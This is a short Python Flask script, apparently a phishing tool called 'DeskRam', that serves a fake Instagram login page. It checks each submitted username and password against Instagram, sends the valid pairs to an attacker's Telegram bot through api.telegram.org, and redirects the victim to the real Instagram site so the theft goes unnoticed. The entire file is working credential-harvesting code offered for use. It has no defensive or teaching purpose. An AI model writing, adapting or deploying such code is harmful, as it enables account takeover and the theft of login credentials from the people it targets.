#!/usr/bin/env python
# """
#  ______   _______  _______  _        _______  _______  _______ 
# (  __  \ (  ____ \(  ____ \| \    /\(  ____ )(  ___  )(  ___  )
# | (  \  )| (    \/| (    \/|  \  / /| (    )|| (   ) || () () |
# | |   ) || (__    | (_____ |  (_/ / | (____)|| (___) || || || |
# | |   | ||  __)   (_____  )|   _ (  |     __)|  ___  || |(_)| |
# | |   ) || (            ) ||  ( \ \ | (\ (   | (   ) || |   | |===>("Ali")
# | (__/  )| (____/\/\____) ||  /  \ \| ) \ \__| )   ( || )   ( |
# (______/ (_______/\_______)|_/    \/|/   \__/|/     \||/     \|
# """         ___                  
# User --- > <(-_-)> Attcker --> :) 
# [+] Tool Face Instgram Page! 

import requests
from flask import Flask, request, render_template, redirect
from check.instagram_login import InstagramLogin
from pyfiglet import Figlet
from colorama import Fore

f = Figlet(font='epic')  

print(Fore.BLUE + f.renderText('DeskRam'))
app = Flask(__name__)
instagram_login = InstagramLogin(app)

@app.route('/', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if not username or not password:
            return render_template('login.html', error="Both username and password are required.")

        response = instagram_login.login(username, password)

        if response.status_code == 200:
            if 'authenticated":true' in response.text or "userId" in response.text:
                # Successful login, redirect to Instagram
                bot_api_key = 'your_telegram_bot_api_key_here'
                chat_id = 'your_telegram_chat_id_here'
                message = f'Username: {username}, Password: {password}'
                telegram_url = f'https://api.telegram.org/bot{bot_api_key}/sendMessage?chat_id={chat_id}&text={message}'
                requests.get(telegram_url)
                return redirect('http://www.instagram.com/')
            else:
                # Incorrect password, render login page with error message
                return render_template('login.html', error="Incorrect password. Please try again.")
        else:
            # Error in request, render login page with error message
            return render_template('login.html', error="Error occurred while logging in. Please try again later.")

    return render_template('login.html', error=None)

if __name__ == '__main__':
    app.run(debug=False)
